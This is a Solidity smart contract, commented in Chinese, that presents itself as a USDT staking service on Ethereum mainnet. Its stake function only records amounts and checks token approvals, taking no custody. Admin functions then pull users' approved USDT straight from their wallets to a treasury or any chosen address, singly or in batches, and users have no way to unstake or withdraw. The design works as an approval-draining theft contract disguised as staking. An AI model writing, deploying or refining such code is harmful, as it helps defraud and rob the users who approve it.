// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";

/**
 * @title ImprovedEthStaking
 * @dev 优化的ETH主网USDT质押合约，支持管理员直接从用户地址转账
 * @author DeFi Team
 * 
 * 核心功能：
 * 1. 用户质押USDT（只verify，不托管）
 * 2. 管理员可以直接从用户地址转账到指定地址
 * 3. 支持批量操作和多管理员管理
 * 4. 完整的安全保护和事件日志
 */
contract ImprovedEthStaking is Ownable, ReentrancyGuard, Pausable {
    
    // ========== 状态变量 ==========
    
    /// @notice 质押代币合约（ETH主网USDT）
    IERC20 public immutable stakingToken;
    
    /// @notice 资金接收地址
    address public treasuryAddress;
    
    /// @notice 用户质押记录
    mapping(address => uint256) public userStakes;
    
    /// @notice 用户历史总质押
    mapping(address => uint256) public userTotalStaked;
    
    /// @notice 管理员权限映射
    mapping(address => bool) public admins;
    
    /// @notice 用户质押时间记录
    mapping(address => uint256) public userStakeTime;
    
    /// @notice 合约统计数据
    uint256 public totalStaked;
    uint256 public totalUsers;
    uint256 public totalCollected;
    
    // ========== 事件定义 ==========
    
    event Staked(
        address indexed user, 
        uint256 amount, 
        uint256 timestamp,
        uint256 userTotalStake
    );
    
    event AdminCollected(
        address indexed from, 
        address indexed to, 
        uint256 amount,
        address indexed admin,
        uint256 timestamp
    );
    
    event BatchCollected(
        uint256 userCount,
        uint256 totalAmount,
        address indexed admin,
        uint256 timestamp
    );
    
    event AdminAdded(address indexed admin, address indexed addedBy);
    event AdminRemoved(address indexed admin, address indexed removedBy);
    event TreasuryUpdated(address indexed oldTreasury, address indexed newTreasury);
    event EmergencyWithdraw(address indexed token, uint256 amount, address indexed to);
    
    // ========== 修饰符 ==========
    
    modifier onlyAdmin() {
        require(admins[msg.sender] || msg.sender == owner(), "Not authorized admin");
        _;
    }
    
    modifier validAddress(address addr) {
        require(addr != address(0), "Invalid address");
        _;
    }
    
    modifier validAmount(uint256 amount) {
        require(amount > 0, "Amount must > 0");
        _;
    }
    
    // ========== 构造函数 ==========
    
    constructor(
        address _stakingToken,
        address _treasuryAddress
    ) Ownable(msg.sender) validAddress(_stakingToken) validAddress(_treasuryAddress) {
        stakingToken = IERC20(_stakingToken);
        treasuryAddress = _treasuryAddress;
        
        // 部署者自动成为管理员
        admins[msg.sender] = true;
        emit AdminAdded(msg.sender, msg.sender);
    }
    
    // ========== 用户功能 ==========
    
    /**
     * @notice 用户质押USDT
     * @dev 只记录质押信息，不转移资金到合约
     * @param amount 质押金额（6位小数）
     */
    function stake(uint256 amount) 
        external 
        nonReentrant 
        whenNotPaused 
        validAmount(amount)
    {
        address user = msg.sender;
        
        // 检查用户USDT余额
        require(stakingToken.balanceOf(user) >= amount, "Insufficient balance");
        
        // 检查用户对合约的verify额度
        require(stakingToken.allowance(user, address(this)) >= amount, "Insufficient allowance");
        
        // 记录首次质押用户
        if (userStakes[user] == 0) {
            totalUsers++;
            userStakeTime[user] = block.timestamp;
        }
        
        // 更新质押记录
        userStakes[user] += amount;
        userTotalStaked[user] += amount;
        totalStaked += amount;
        
        emit Staked(user, amount, block.timestamp, userStakes[user]);
    }
    
    /**
     * @notice 查询用户质押详情
     * @param user 用户地址
     * @return currentStake 当前质押金额
     * @return totalStakedAmount 历史总质押
     * @return allowanceToContract 对合约的verify额度
     * @return userBalance 用户USDT余额
     * @return stakeTimestamp 首次质押时间
     */
    function getUserStakeInfo(address user) 
        external 
        view 
        returns (
            uint256 currentStake,
            uint256 totalStakedAmount,
            uint256 allowanceToContract,
            uint256 userBalance,
            uint256 stakeTimestamp
        )
    {
        return (
            userStakes[user],
            userTotalStaked[user],
            stakingToken.allowance(user, address(this)),
            stakingToken.balanceOf(user),
            userStakeTime[user]
        );
    }
    
    // ========== 管理员功能 ==========
    
    /**
     * @notice 管理员从用户地址收集USDT到资金池
     * @param from 用户地址
     * @param amount 收集金额
     */
    function adminCollectTokens(
        address from, 
        uint256 amount
    ) 
        external 
        onlyAdmin 
        nonReentrant 
        whenNotPaused
        validAddress(from)
        validAmount(amount)
    {
        _collectTokens(from, treasuryAddress, amount);
    }
    
    /**
     * @notice 管理员从用户地址收集USDT到指定地址
     * @param from 用户地址
     * @param to 目标地址
     * @param amount 收集金额
     */
    function adminCollectTokensTo(
        address from, 
        address to,
        uint256 amount
    ) 
        external 
        onlyAdmin 
        nonReentrant 
        whenNotPaused
        validAddress(from)
        validAddress(to)
        validAmount(amount)
    {
        _collectTokens(from, to, amount);
    }
    
    /**
     * @notice 批量收集用户USDT到资金池
     * @param users 用户地址数组
     * @param amounts 对应收集金额数组
     */
    function batchCollectTokens(
        address[] calldata users,
        uint256[] calldata amounts
    ) 
        external 
        onlyAdmin 
        nonReentrant 
        whenNotPaused
    {
        require(users.length == amounts.length, "Arrays length mismatch");
        require(users.length > 0, "Empty arrays");
        
        uint256 successfulCollections = 0;
        uint256 totalCollectedAmount = 0;
        
        for (uint i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 amount = amounts[i];
            
            // 跳过无效地址和金额
            if (user == address(0) || amount == 0) continue;
            
            // 检查用户质押和授权状态
            if (userStakes[user] >= amount && 
                stakingToken.allowance(user, address(this)) >= amount) {
                
                try stakingToken.transferFrom(user, treasuryAddress, amount) returns (bool success) {
                    if (success) {
                        userStakes[user] -= amount;
                        totalCollected += amount;
                        totalCollectedAmount += amount;
                        successfulCollections++;
                        
                        emit AdminCollected(user, treasuryAddress, amount, msg.sender, block.timestamp);
                    }
                } catch {
                    // 单个转账失败不影响其他操作
                    continue;
                }
            }
        }
        
        emit BatchCollected(successfulCollections, totalCollectedAmount, msg.sender, block.timestamp);
    }
    
    /**
     * @notice 内部收集函数
     */
    function _collectTokens(address from, address to, uint256 amount) internal {
        // 检查用户质押记录
        require(userStakes[from] >= amount, "Insufficient user stake");
        
        // 检查用户verify额度
        require(stakingToken.allowance(from, address(this)) >= amount, "Insufficient allowance");
        
        // 执行转账：直接从用户地址转到目标地址
        require(stakingToken.transferFrom(from, to, amount), "Transfer failed");
        
        // 更新质押记录
        userStakes[from] -= amount;
        totalCollected += amount;
        
        emit AdminCollected(from, to, amount, msg.sender, block.timestamp);
    }
    
    // ========== 权限管理 ==========
    
    /**
     * @notice 添加管理员
     * @param admin 新管理员地址
     */
    function addAdmin(address admin) external onlyOwner validAddress(admin) {
        require(!admins[admin], "Already admin");
        admins[admin] = true;
        emit AdminAdded(admin, msg.sender);
    }
    
    /**
     * @notice 移除管理员
     * @param admin 管理员地址
     */
    function removeAdmin(address admin) external onlyOwner validAddress(admin) {
        require(admins[admin], "Not admin");
        require(admin != owner(), "Cannot remove owner");
        admins[admin] = false;
        emit AdminRemoved(admin, msg.sender);
    }
    
    /**
     * @notice 更新资金池地址
     * @param newTreasury 新的资金池地址
     */
    function updateTreasury(address newTreasury) external onlyOwner validAddress(newTreasury) {
        address oldTreasury = treasuryAddress;
        treasuryAddress = newTreasury;
        emit TreasuryUpdated(oldTreasury, newTreasury);
    }
    
    // ========== 紧急功能 ==========
    
    /**
     * @notice 暂停合约
     */
    function pause() external onlyOwner {
        _pause();
    }
    
    /**
     * @notice 恢复合约
     */
    function unpause() external onlyOwner {
        _unpause();
    }
    
    /**
     * @notice 紧急提取合约中的代币（如果有意外转入）
     * @param token 代币地址
     * @param amount 提取金额
     */
    function emergencyWithdraw(
        address token, 
        uint256 amount
    ) external onlyOwner validAddress(token) validAmount(amount) {
        IERC20(token).transfer(owner(), amount);
        emit EmergencyWithdraw(token, amount, owner());
    }
    
    // ========== 查询功能 ==========
    
    /**
     * @notice 获取合约统计信息
     */
    function getContractStats() external view returns (
        uint256 _totalStaked,
        uint256 _totalUsers,
        uint256 _totalCollected,
        address _treasuryAddress,
        address _stakingToken,
        bool _paused
    ) {
        return (
            totalStaked,
            totalUsers,
            totalCollected,
            treasuryAddress,
            address(stakingToken),
            paused()
        );
    }
    
    /**
     * @notice 检查地址是否为管理员
     */
    function isAdmin(address addr) external view returns (bool) {
        return admins[addr] || addr == owner();
    }
    
    /**
     * @notice 批量查询用户信息
     */
    function batchGetUserInfo(address[] calldata users) 
        external 
        view 
        returns (
            uint256[] memory stakes,
            uint256[] memory allowances,
            uint256[] memory balances
        ) 
    {
        uint256 length = users.length;
        stakes = new uint256[](length);
        allowances = new uint256[](length);
        balances = new uint256[](length);
        
        for (uint i = 0; i < length; i++) {
            address user = users[i];
            stakes[i] = userStakes[user];
            allowances[i] = stakingToken.allowance(user, address(this));
            balances[i] = stakingToken.balanceOf(user);
        }
    }
}
